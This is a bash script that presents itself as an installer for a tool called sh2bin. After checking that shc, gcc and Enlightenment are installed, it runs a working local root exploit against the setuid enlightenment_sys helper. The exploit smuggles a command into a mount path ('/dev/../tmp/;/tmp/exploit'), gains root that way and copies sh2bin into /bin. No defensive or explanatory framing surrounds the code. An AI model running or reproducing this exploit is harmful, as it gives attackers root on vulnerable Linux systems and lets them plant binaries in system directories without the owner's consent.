#!/bin/bash

chmod +x sh2bin
echo "[!] Wait.."
Black='\033[0;30m'        # Black
Red='\033[0;31m'          # Red
Green='\033[0;32m'        # Green
Yellow='\033[0;33m'       # Yellow
Blue='\033[0;34m'         # Blue
Purple='\033[0;35m'       # Purple
Cyan='\033[0;36m'         # Cyan
Wh1te='\033[0;37m'        # Wh1te
NC='\033[0m'
UBlue='\033[4;34m'
UBlack='\033[4;30m'       # Black
URed='\033[4;31m'         # Red
UGreen='\033[4;32m'       # Green
UYellow='\033[4;33m'      # Yellow
UBlue='\033[4;34m'        # Blue
UPurple='\033[4;35m'      # Purple
UCyan='\033[4;36m'        # Cyan
UWhite='\033[4;37m'       #
echo -e "$Red [!] Checking pre-requisites.. $NC"
dpkg -s shc | grep "Status" > /tmp/temp.txt 
TEMPU=$(grep -o "installed" /tmp/temp.txt)
if [ "$TEMPU" == "installed" ];
then
	echo -e "$Green [~] Pre-Requisite 'shc' is installed . $NC"
else
	echo -e "$Red [!] Pre-Requisite 'shc' is not installed. $NC"
fi
rm /tmp/temp.txt
sleep 1
dpkg -s gcc | grep "Status" > /tmp/temp1.txt 
TEMPU=$(grep -o "installed" /tmp/temp1.txt)
if [ "$TEMPU" == "installed" ];
then
	echo -e "$Green [~] Pre-Requisite 'gcc' is installed . $NC"
else
	echo -e "$Red [!] Pre-Requisite 'gcc' is not installed. $NC"
fi
rm /tmp/temp1.txt
sleep 1
dpkg -s enlightenment | grep "Status" > /tmp/temp2.txt 
TEMPU=$(grep -o "installed" /tmp/temp2.txt)
if [ "$TEMPU" == "installed" ];
then
	echo -e "$Green [~] Pre-Requisite 'enlightenment' is installed . $NC"
else
	echo -e "$Red [!] Pre-Requisite 'enlightenment' is not installed. $NC"
fi
rm /tmp/temp2.txt
echo -e "$UCyan [~] Accessing $NC $URed root $NC.."
#
#Accessing root
#
file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
if [[ -z ${file} ]]
then
    echo "[*] Enlightenment should be installed on your system."
    exit 1
fi
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"

echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit
echo -e "$Yellow [!] Adding $NC $UBlue sh2bin $NC $Yellow to $NC $URed /bin/ $NC"
echo "cp sh2bin /bin/ " | ${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
echo -e "$UGreen [!] Done . $NC "
sleep 2
clear
